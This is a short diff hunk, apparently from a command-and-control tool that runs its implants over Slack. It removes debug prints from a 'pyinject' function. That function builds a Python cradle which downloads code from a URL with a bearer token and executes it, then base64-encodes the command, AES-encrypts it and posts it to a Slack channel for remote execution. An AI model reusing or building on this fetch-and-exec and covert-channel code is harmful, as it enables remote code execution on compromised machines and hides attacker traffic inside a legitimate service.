@@ -594,11 +594,9 @@ def pyinject(bearer, commands, client_id, filepath):  # Function execute python 
     print(url)
     cradle = "import urllib2;r=urllib2.Request(\"" + url + "\");r.add_header(\"Authorization\", \"Bearer "\
              + token + "\");s=urllib2.urlopen(r);exec(s.read())"
-    print(cradle)
     encoded = base64.b64encode(cradle.encode("utf-8"))
     cradle = str(encoded, "utf-8")
     command = "python -c \\\"import base64\;exec\(base64.b64decode\(\\\'" + cradle + "\\\'\)\) \\\" \; echo "
-    print(command)
     command = aes_encrypt.encrypt(command)
     data = {"channel": commands, "text": prefix + command}
     r = requests.post('https://slack.com/api/chat.postMessage', headers=headers, data=data)
